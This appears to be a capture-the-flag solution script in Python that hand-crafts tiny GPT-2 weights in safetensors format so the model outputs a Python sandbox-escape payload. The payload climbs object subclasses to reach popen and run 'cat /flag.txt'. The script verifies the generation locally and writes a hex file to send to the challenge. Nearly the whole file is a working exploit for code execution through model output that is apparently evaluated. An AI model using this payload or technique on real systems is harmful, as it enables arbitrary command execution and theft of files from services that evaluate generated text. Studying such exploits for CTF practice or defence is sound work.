#!/usr/bin/env python3
import argparse
import json
import math
import struct
from array import array
from pathlib import Path


VOCAB_SIZE = 99
N_EMBD = 64
N_POSITIONS = 512
BOS_ID = 1
EOS_ID = 2

PAYLOAD_TEMPLATE = "[c for c in ().__class__.__base__.__subclasses__()if c.__name__=='_wrap_close'][0].__init__.__globals__['popen']('cat {flag_path}').read()"


def char_to_token(ch: str) -> int:
    code = ord(ch)
    if code < 32 or code > 126:
        raise ValueError(f"unsupported character: {ch!r}")
    return code - 28


def token_to_char(tok: int) -> str:
    if tok < 4 or tok >= VOCAB_SIZE:
        raise ValueError(f"not a printable token: {tok}")
    return chr(tok + 28)


def zeros_1d(size: int) -> list[float]:
    return [0.0] * size


def zeros_2d(rows: int, cols: int) -> list[list[float]]:
    return [[0.0] * cols for _ in range(rows)]


def ones_1d(size: int) -> list[float]:
    return [1.0] * size


def flatten_1d(values: list[float]) -> bytes:
    return array("f", values).tobytes()


def flatten_2d(values: list[list[float]]) -> bytes:
    flat = array("f")
    for row in values:
        flat.extend(row)
    return flat.tobytes()


def layernorm(vec: list[float]) -> list[float]:
    mean = sum(vec) / len(vec)
    var = sum((x - mean) * (x - mean) for x in vec) / len(vec)
    scale = 1.0 / math.sqrt(var + 1e-5)
    return [(x - mean) * scale for x in vec]


def dot(a: list[float], b: list[float]) -> float:
    return sum(x * y for x, y in zip(a, b))


def standardized_basis(dim: int, width: int) -> list[float]:
    denom = math.sqrt(width - 1)
    vec = [-1.0 / denom] * width
    vec[dim] = denom
    return vec


def write_safetensors(path: Path, tensors: list[tuple[str, str, list[int], bytes]]) -> None:
    header = {"__metadata__": {"format": "pt"}}
    offset = 0
    for name, dtype, shape, data in tensors:
        header[name] = {
            "dtype": dtype,
            "shape": shape,
            "data_offsets": [offset, offset + len(data)],
        }
        offset += len(data)

    header_bytes = json.dumps(header, separators=(",", ":")).encode()
    with path.open("wb") as f:
        f.write(struct.pack("<Q", len(header_bytes)))
        f.write(header_bytes)
        for _, _, _, data in tensors:
            f.write(data)


def build_model(payload: str) -> tuple[list[list[float]], list[list[float]], list[int]]:
    target_tokens = [char_to_token(ch) for ch in payload] + [EOS_ID]
    used_tokens = []
    for tok in target_tokens:
        if tok not in used_tokens:
            used_tokens.append(tok)

    if len(used_tokens) > N_EMBD:
        raise ValueError("not enough embedding dimensions for unique token steering")

    dims = {tok: i for i, tok in enumerate(used_tokens)}
    basis = {tok: standardized_basis(dim, N_EMBD) for tok, dim in dims.items()}

    token_scale = 1.0
    pos_scale = 1000.0

    wte = zeros_2d(VOCAB_SIZE, N_EMBD)
    for tok, vec in basis.items():
        wte[tok][dims[tok]] = token_scale

    eos_vec = basis[EOS_ID]
    wpe = zeros_2d(N_POSITIONS, N_EMBD)
    for pos in range(N_POSITIONS):
        chosen = basis[target_tokens[pos]] if pos < len(target_tokens) else eos_vec
        wpe[pos] = [pos_scale * x for x in chosen]

    return wte, wpe, target_tokens


def build_tensors(payload: str) -> tuple[list[tuple[str, str, list[int], bytes]], list[list[float]], list[list[float]], list[int]]:
    wte, wpe, target_tokens = build_model(payload)
    tensors: list[tuple[str, str, list[int], bytes]] = []

    for layer in range(2):
        prefix = f"transformer.h.{layer}"
        tensors.extend(
            [
                (f"{prefix}.attn.c_attn.bias", "F32", [192], flatten_1d(zeros_1d(192))),
                (f"{prefix}.attn.c_attn.weight", "F32", [64, 192], flatten_2d(zeros_2d(64, 192))),
                (f"{prefix}.attn.c_proj.bias", "F32", [64], flatten_1d(zeros_1d(64))),
                (f"{prefix}.attn.c_proj.weight", "F32", [64, 64], flatten_2d(zeros_2d(64, 64))),
                (f"{prefix}.ln_1.bias", "F32", [64], flatten_1d(zeros_1d(64))),
                (f"{prefix}.ln_1.weight", "F32", [64], flatten_1d(ones_1d(64))),
                (f"{prefix}.ln_2.bias", "F32", [64], flatten_1d(zeros_1d(64))),
                (f"{prefix}.ln_2.weight", "F32", [64], flatten_1d(ones_1d(64))),
                (f"{prefix}.mlp.c_fc.bias", "F32", [128], flatten_1d(zeros_1d(128))),
                (f"{prefix}.mlp.c_fc.weight", "F32", [64, 128], flatten_2d(zeros_2d(64, 128))),
                (f"{prefix}.mlp.c_proj.bias", "F32", [64], flatten_1d(zeros_1d(64))),
                (f"{prefix}.mlp.c_proj.weight", "F32", [128, 64], flatten_2d(zeros_2d(128, 64))),
            ]
        )

    tensors.extend(
        [
            ("transformer.ln_f.bias", "F32", [64], flatten_1d(zeros_1d(64))),
            ("transformer.ln_f.weight", "F32", [64], flatten_1d(ones_1d(64))),
            ("transformer.wpe.weight", "F32", [N_POSITIONS, N_EMBD], flatten_2d(wpe)),
            ("transformer.wte.weight", "F32", [VOCAB_SIZE, N_EMBD], flatten_2d(wte)),
        ]
    )

    return tensors, wte, wpe, target_tokens


def simulate_generation(wte: list[list[float]], wpe: list[list[float]], limit: int = 256) -> str:
    tokens = [BOS_ID]
    generated: list[int] = []

    for pos in range(limit):
        prev = tokens[-1]
        hidden = [a + b for a, b in zip(wte[prev], wpe[pos])]
        normed = layernorm(hidden)
        logits = [dot(normed, emb) for emb in wte]
        nxt = max(range(VOCAB_SIZE), key=lambda idx: logits[idx])
        if nxt == EOS_ID:
            break
        generated.append(nxt)
        tokens.append(nxt)

    return "".join(token_to_char(tok) for tok in generated)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true", help="target local ./flag.txt instead of remote /flag.txt")
    args = parser.parse_args()

    flag_path = "flag.txt" if args.local else "/flag.txt"
    payload = PAYLOAD_TEMPLATE.format(flag_path=flag_path)

    out_dir = Path(__file__).resolve().parent
    safetensors_path = out_dir / "exploit.safetensors"
    hex_path = out_dir / "exploit.hex"

    tensors, wte, wpe, target_tokens = build_tensors(payload)
    simulated = simulate_generation(wte, wpe)
    if simulated != payload:
        raise SystemExit("local simulation failed to reproduce the payload")

    write_safetensors(safetensors_path, tensors)
    data = safetensors_path.read_bytes()
    hex_path.write_text(data.hex())

    print(f"target: {'local ./flag.txt' if args.local else 'remote /flag.txt'}")
    print(f"payload length: {len(payload)}")
    print(f"model bytes: {len(data)}")
    print(f"hex chars: {len(data) * 2}")
    print(f"generated locally: {simulated}")
    print(f"wrote {safetensors_path.name} and {hex_path.name}")
    print("send the contents of exploit.hex to the challenge")


if __name__ == "__main__":
    main()
